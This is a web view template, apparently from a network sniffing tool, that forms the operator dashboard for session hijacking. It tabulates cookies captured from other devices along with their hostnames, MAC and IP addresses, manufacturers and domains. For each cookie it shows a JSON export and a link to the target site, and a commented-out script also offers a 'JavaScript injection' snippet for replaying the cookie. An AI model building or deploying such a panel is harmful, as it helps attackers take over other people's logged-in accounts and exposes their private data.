@extends('default')

@section('scripts')
<!--<script type="text/javascript">
function loadTable(){
	$.get("api/session-hijacking",function(data,status){
		if(status!='success'){
			return;
		}
		data=jQuery.parseJSON(data);
		var rows='';
		var popup='';
		$.each(data, function(index,item){
			rows+='<tr>';
			rows+='<td>'+item.hostname+'</td>';
			rows+='<td>'+item.clientMAC+'</td>';
			rows+='<td>'+item.clientIP+'</td>';
			rows+='<td>'+item.domain+'</td>';
			rows+='<td><button class="btn btn-primary" data-toggle="modal" data-target="#'+item.uid+'">查看</button></td>';
			rows+='<td>'+item.updated_at+'</td>';
			rows+='</tr>';
			popup+='<div class="modal fade" id="'+item.uid+'" tabindex="-1" role="dialog" aria-labelledby="'+item.uid+'" aria-hidden="true">';
			popup+='<div class="modal-dialog">';
			popup+='<div class="modal-content">';
			popup+='<div class="modal-header">';
			popup+='<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>';
			popup+='<h4 class="modal-title" id="myModalLabel">Cookie</h4>';
			popup+='</div>';
			popup+='<div class="modal-body">';
			popup+='<textarea style="width:100%" class="form-control" rows="5">'+item.cookiejson+'</textarea>';
			popup+='<hr>';
			popup+='JavaScript注入<span>|</span><a href="http://'+item.domain+'/" target="_blank">'+item.domain+'</a>';
			popup+='<textarea style="width:100%" class="form-control" rows="5">'+item.cookiejs+'</textarea>';
			popup+='</div><div class="modal-footer"><button type="button" class="btn btn-default" data-dismiss="modal">Close</button></div></div></div></div>';
		});
		$('#table-data').html(rows);
		$('#popup').html(popup);
	});
}
window.onload=loadTable();
</script>-->
@stop

@section('content')
<div id="popup">
@foreach($cookies as $cookie)
	<div class="modal fade" id="{{ $cookie['uid'] }}" tabindex="-1" role="dialog" aria-labelledby="{{ $cookie['uid'] }}" aria-hidden="true">
		<div class="modal-dialog">
			<div class="modal-content">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
					<h4 class="modal-title" id="myModalLabel">Cookie in JSON format</h4>
				</div>
				<div class="modal-body">
					<textarea style="width:100%" class="form-control" rows="10">{{ Tools::jsonCookie($cookie['cookie'],$cookie['domain']) }}</textarea>
				</div>
				<div class="modal-footer">
					<a type="button" class="btn btn-primary" href="http://{{ $cookie['domain'] }}/" target="_blank">{{ $cookie['domain'] }}</a>
					<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
				</div>
			</div>
		</div>
	</div>
@endforeach
</div>
<table class="table table-hover table-bordered table-condensed">
	<thead>
		<tr class="active">
		<th>主机名</th>
		<th>MAC地址</th>
		<th>IP地址</th>
		<th>设备制造商</th>
		<th>域名</th>
		<th>Cookie</th>
		<th>时间</th>
		</tr>
	</thead>
	<tbody id="table-data">
		@foreach($cookies as $cookie)
		<tr>
		<td>{{ $cookie['hostname'] }}</td>
		<td>{{ $cookie['clientMAC'] }}</td>
		<td>{{ $cookie['clientIP'] }}</td>
		<td>{{ $cookie['manufacturer'] }}</td>
		<td>{{ $cookie['domain'] }}</td>
		<td><button class="btn btn-primary" data-toggle="modal" data-target="#{{ $cookie['uid'] }}">查看</button></td>
		<td>{{ $cookie['updated_at'] }}</td>
		</tr>
		@endforeach
	</tbody>
</table>
@stop
